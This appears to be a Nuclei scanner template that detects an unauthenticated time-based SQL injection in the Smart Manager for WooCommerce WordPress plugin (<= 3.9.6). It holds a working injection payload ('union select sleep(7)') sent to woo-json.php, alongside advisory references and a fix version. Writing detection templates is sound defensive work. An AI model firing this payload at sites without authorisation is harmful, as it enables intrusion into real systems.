http:
- matchers:
  - condition: and
    dsl:
    - duration_2>=7
    - status_code_2 == 500
    - contains(body_1, "Smart Manager for e-Commerce")
    - contains(body_2, "rel=\"preconnect") || contains(body, "Error</title>")
    type: dsl
  raw:
  - 'GET /wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 15s

    POST /wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D

    '
id: wp-smart-manager-sqli
info:
  author: r3Y3r53
  description: "The Smart Manager For WooCommerce \u2013 Stock Management, Bulk Edit\
    \ & more\u2026 WordPress plugin was affected by an Unauthenticated SQL Injection\
    \ security vulnerability.\n"
  metadata:
    max-request: 2
    publicwww-query: /wp-content/plugins/smart-manager-for-wp-e-commerce/
    verified: true
  name: Smart Manager for WooCommerce & WPeC <= 3.9.6 - SQL Injection
  reference:
  - https://wpscan.com/vulnerability/e060fbff-792f-4fb5-baa5-82d80240ec99
  - http://cinu.pl/research/wp-plugins/mail_0666ceeca20683907bf82514e8f93e0f.html
  - https://wordpress.org/plugins/smart-manager-for-wp-e-commerce/
  remediation: Fixed in version 3.9.7
  severity: critical
  tags: time-based-sqli,wpscan,wp,wp-plugin,wordpress,smart-manager-for-wp-e-commerce,sqli,vuln
